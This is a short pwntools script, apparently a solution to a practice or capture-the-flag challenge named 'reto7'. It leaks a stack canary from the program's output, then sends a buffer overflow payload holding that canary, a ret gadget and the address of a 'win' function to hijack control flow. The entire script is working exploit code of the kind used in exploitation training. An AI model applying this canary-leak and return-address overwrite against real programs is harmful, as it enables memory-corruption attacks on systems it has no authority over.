from pwn import *

elf = ELF("./reto7")

context.terminal = ["x-terminal-emulator", "-e"]
context.binary = elf

# WIN = 0x0000000000401216
WIN = elf.symbols.win
RET = ROP(elf).ret.address #0x40122f

p = process("./reto7")
attach(p, "continue")

p.sendlineafter(b"length", b"48")
p.sendlineafter(b"bytes", "aaa")
p.recvuntil(b"was:\n")
leak = p.recvuntil("Introduce", drop=True)
canary = leak[-9:-1]

payload = b""
payload = flat([
	b"A"*40,
	canary,
	b"A"*8,
	RET,
	WIN
])
print(payload)
print(hexdump(payload))
p.sendlineafter(b"length", str(len(payload)).encode())
p.sendlineafter(b"bytes", payload)

p.interactive()